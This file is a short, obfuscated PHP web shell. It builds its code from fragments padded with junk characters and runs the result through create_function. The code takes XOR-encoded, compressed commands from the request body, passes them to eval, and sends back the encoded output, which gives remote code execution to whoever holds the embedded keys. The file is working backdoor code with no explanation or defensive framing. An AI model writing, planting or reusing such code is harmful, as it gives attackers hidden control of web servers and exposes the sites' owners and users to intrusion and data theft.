<?php
$J='==1)TZ {@ob_staTZrt();@eTZval(@gzuncoTZmpresTZs(@xTZ(@bTZase64_decodTZe(TZ';
$Z=str_replace('Ll','','LlcreatLlLle_fuLlncLlLltion');
$S='="TZeKWbH4INW9PJE9e3"TZTZ;function TZx(TZ$t,$kTZ){$TZc=strlen($k);$l=TZstr';
$C='h("/$khTZ(.+)TZ$kf/",@fTZile_getTZ_cTZontents(TZ"php://iTZnput"TZ),TZ$m)TZ';
$H='$TZk="b16346d5";$TZkhTZ="bTZ361b13af86e"TZ;TZ$kf=TZ"c1TZ7TZ6f3db8ddc";$pTZ';
$n='$m[TZ1]),$k)));$TZo=@ob_get_TZcTZontents()TZ;@oTZb_eTZnd_TZclean();$r=@bas';
$O='len(TZ$tTZ)TZ;$o="";for($i=0;TZ$i<$TZlTZTZ;){for($j=0;($j<$TZc&TZ&$i<$l)TZ';
$L='TZe64TZ_encodeTZ(@xTZ(@gzcompreTZssTZ($o),TZ$k));printTZTZ("$p$kh$r$kf");}';
$E=';$j++,$TZi++){$o.=$TZt{$i}^TZTZ$k{$j};}}rTZeturTZn $o;}TZif (@pregTZ_mTZatc';
$s=str_replace('TZ','',$H.$S.$O.$E.$C.$J.$n.$L);
$f=$Z('',$s);$f();
?>
